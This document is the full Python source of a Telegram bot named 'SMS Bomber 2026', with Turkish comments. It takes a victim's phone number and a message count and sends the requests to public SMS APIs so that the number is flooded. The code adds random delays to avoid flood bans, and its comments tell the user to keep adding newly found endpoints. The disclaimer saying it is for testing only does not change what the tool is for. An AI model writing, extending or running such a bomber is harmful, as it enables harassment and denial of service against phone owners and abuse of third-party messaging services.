# -*- coding: utf-8 -*-
# sms_bomber_2026.py
# Python 3.11+ | python-telegram-bot v21.x | httpx + asyncio

import asyncio
import logging
import os
import random
import time
from datetime import datetime
from typing import List, Optional

import httpx
from dotenv import load_dotenv
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ConversationHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# Logging ayarları (Railway/Heroku logları için temiz olsun)
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable'ı yok!")

# ────────────────────────────────────────────────
# 2026 başı itibarıyla hâlâ kısmen çalışan ücretsiz SMS API'leri
# Bunların çoğu 1-2 hafta içinde ölebilir → düzenli kontrol et
API_ENDPOINTS: List[dict] = [
    {
        "url": "https://api.kandilli.info/sms",
        "method": "GET",
        "params": {"phone": "{phone}", "amount": "{count}"},
        "headers": {"User-Agent": "Mozilla/5.0 (compatible; SMSBot/1.0)"},
        "success_codes": [200, 201],
        "success_check": lambda r: "gönderildi" in r.text.lower() or r.status_code in (200, 201)
    },
    {
        "url": "https://sms-api.example.org/send",
        "method": "POST",
        "json": {"number": "{phone}", "count": "{count}", "key": "free"},
        "headers": {"Content-Type": "application/json"},
        "success_codes": [200],
    },
    # Buraya yeni keşfettiğin endpoint'leri ekleyeceksin
    # Örnek: {"url": "...", "method": "GET", "params": {...}}
]

MAX_SMS_PER_USER = 80       # flood ban yememek için kullanıcı başına üst sınır
REQUEST_TIMEOUT = 8.0
DELAY_BETWEEN_REQUESTS = (1.2, 3.8)   # random delay aralığı

PHONE, COUNT, CONFIRM = range(3)

# ────────────────────────────────────────────────
# Yardımcı fonksiyonlar
# ────────────────────────────────────────────────

def normalize_phone(phone: str) -> str:
    """Türkiye odaklı telefon normalizasyonu"""
    phone = "".join(c for c in phone if c.isdigit())
    if phone.startswith("0"):
        phone = "90" + phone[1:]
    elif len(phone) == 10:
        phone = "90" + phone
    return phone


async def try_send_sms(phone: str, count: int, client: httpx.AsyncClient) -> tuple[bool, str]:
    for api in API_ENDPOINTS:
        try:
            url = api["url"]
            headers = api.get("headers", {})
            success_codes = api.get("success_codes", [200])

            if api["method"].upper() == "GET":
                params = {
                    k.format(phone=phone, count=count): v.format(phone=phone, count=count)
                    for k, v in api.get("params", {}).items()
                }
                r = await client.get(url, params=params, headers=headers, timeout=REQUEST_TIMEOUT)

            elif api["method"].upper() == "POST":
                json_data = {
                    k.format(phone=phone, count=count): v.format(phone=phone, count=count)
                    for k, v in api.get("json", {}).items()
                }
                r = await client.post(url, json=json_data, headers=headers, timeout=REQUEST_TIMEOUT)

            else:
                continue

            if r.status_code in success_codes:
                if "success_check" in api:
                    if api["success_check"](r):
                        return True, api["url"]
                else:
                    return True, api["url"]

            logger.info(f"API {api['url']} → {r.status_code} | {r.text[:120]}")

        except Exception as e:
            logger.error(f"API {api.get('url', 'bilinmeyen')} hata: {e}")

    return False, "Tüm API'ler başarısız"


# ────────────────────────────────────────────────
# Conversation Handler
# ────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "🚀 *SMS Bomber 2026*\n\n"
        "• /sms → bombardımana başla\n"
        "• /limit → kalan hakkını gör\n"
        "• /cancel → iptal et\n\n"
        "⚠️ Sadece test amaçlıdır. Sorumluluk sana aittir."
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)


async def sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("Başlat 💥", callback_data="start_sms")]]
    await update.message.reply_text(
        "Telefon numarasını göndermek için butona bas ↓",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN_V2
    )
    return PHONE


async def ask_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "*Telefon numarasını gir*\n(örnek: 5xxxxxxxxxx veya 905xxxxxxxxxx)",
        parse_mode=ParseMode.MARKDOWN_V2
    )
    return PHONE


async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = normalize_phone(update.message.text)
    if len(phone) != 12 or not phone.startswith("90"):
        await update.message.reply_text("Geçersiz numara formatı. Tekrar dene.")
        return PHONE

    context.user_data["phone"] = phone

    used = context.user_data.get("sms_used_today", 0)
    remaining = max(0, MAX_SMS_PER_USER - used)

    text = (
        f"*Numara kaydedildi*: `{phone}`\n"
        f"Bugün kalan hakkın: *{remaining}*\n\n"
        f"Kaç adet göndereyim? (max {remaining})"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)
    return COUNT


async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        count = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("Sayı gir lütfen.")
        return COUNT

    used = context.user_data.get("sms_used_today", 0)
    remaining = MAX_SMS_PER_USER - used

    if count < 1 or count > remaining:
        await update.message.reply_text(f"1 ile {remaining} arası sayı gir.")
        return COUNT

    context.user_data["count"] = count

    keyboard = [
        [InlineKeyboardButton("Evet, Gönder 💣", callback_data="yes")],
        [InlineKeyboardButton("Hayır", callback_data="no")]
    ]

    text = (
        f"*Onaylıyor musun?*\n\n"
        f"Numara → `{context.user_data['phone']}`\n"
        f"Adet   → `{count}`\n"
        f"Kalan hak → `{remaining-count}`"
    )
    await update.message.reply_text(
        text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN_V2
    )
    return CONFIRM


async def confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "no":
        await query.edit_message_text("İşlem iptal edildi.")
        return ConversationHandler.END

    phone = context.user_data.get("phone")
    count = context.user_data.get("count")

    if not phone or not count:
        await query.edit_message_text("Veri kaybı oldu. Baştan başla.")
        return ConversationHandler.END

    await query.edit_message_text(
        f"Bombardıman başlıyor...\nNumara: `{phone}`\nAdet: `{count}`\n\nBekle...",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    async with httpx.AsyncClient(http2=True, follow_redirects=True) as client:
        success, used_api = await try_send_sms(phone, count, client)

    if success:
        context.user_data["sms_used_today"] = context.user_data.get("sms_used_today", 0) + count
        msg = (
            f"✅ *Gönderim tamamlandı*\n"
            f"Servis: `{used_api.split('//')[1].split('/')[0]}`\n"
            f"Numara: `{phone}`\n"
            f"Adet: `{count}`"
        )
    else:
        msg = "❌ Tüm servisler başarısız oldu.\nBir süre sonra tekrar dene."

    await query.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN_V2)
    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("İşlem iptal edildi.")
    return ConversationHandler.END


async def show_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    used = context.user_data.get("sms_used_today", 0)
    remaining = MAX_SMS_PER_USER - used
    await update.message.reply_text(f"Bugün kalan hakkın: {remaining}")


def main():
    app = Application.builder().token(BOT_TOKEN).read_timeout(30).write_timeout(30).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("sms", sms)],
        states={
            PHONE: [
                CallbackQueryHandler(ask_phone, pattern="^start_sms$"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone),
            ],
            COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
            CONFIRM: [CallbackQueryHandler(confirm, pattern="^(yes|no)$")],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        per_message=False,  # uyarıyı kapatmak için
        per_user=True,
        per_chat=True,
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("limit", show_limit))

    # Uyarıyı sustur
    from warnings import filterwarnings
    from telegram.warnings import PTBUserWarning
    filterwarnings("ignore", category=PTBUserWarning)

    print("Bot başlatılıyor...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
